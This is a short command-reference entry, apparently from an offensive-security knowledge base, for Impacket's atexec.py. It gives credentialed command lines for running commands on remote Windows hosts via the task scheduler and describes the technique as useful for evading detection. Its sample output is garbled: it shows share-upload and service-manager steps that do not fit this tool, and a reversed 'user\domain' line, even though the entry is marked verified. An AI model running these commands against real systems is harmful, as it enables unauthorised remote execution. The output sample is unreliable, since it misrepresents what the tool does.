---
id: 7f931104-222b-4bf1-b22a-af707d211fd7
name: impacket-atexec-execute-command
type: command
executor: bash
data: 'atexec.py DOMAIN/username:password@10.10.10.10'
output: null
created_at: '2023-04-06T03:56:30.837316+00:00'
updated_at: '2023-10-10T20:37:57.936960+00:00'
platforms:
  - Windows
tags:
  - impacket
  - remote-execution
  - task-scheduler
verified: true
validated: true
---

# impacket-atexec-execute-command

## Command

```bash
atexec.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP
```

## Description

Executes commands on a remote Windows host using the AT scheduler service via Impacket, capturing output through SMB. Useful for evading detection on direct execution monitoring.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain name | Yes (or empty for local) |
| $_USERNAME | Username for authentication | Yes |
| $_PASSWORD | Password for authentication | Yes |
| $_TARGET_IP | IP address or hostname of target | Yes |
| -debug | Enable debug output | No |

## Examples

### Basic Usage

```bash
atexec.py DOMAIN/user:pass@192.168.1.100
```

### With Specific Command

```bash
atexec.py DOMAIN/user:pass@192.168.1.100 "whoami"
```

## Expected Output

Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 192.168.1.100.....
[*] Found writable share ADMIN$\temp
[*] Uploading file...
[*] Opening SVCManager on 192.168.1.100...
[*] Created \temp\exec in 192.168.1.100
user\domain

## Related

- [[procedures/Remote-Command-Execution-with-Impacket-Using-Credentials]]
- [[tools/Impacket]]
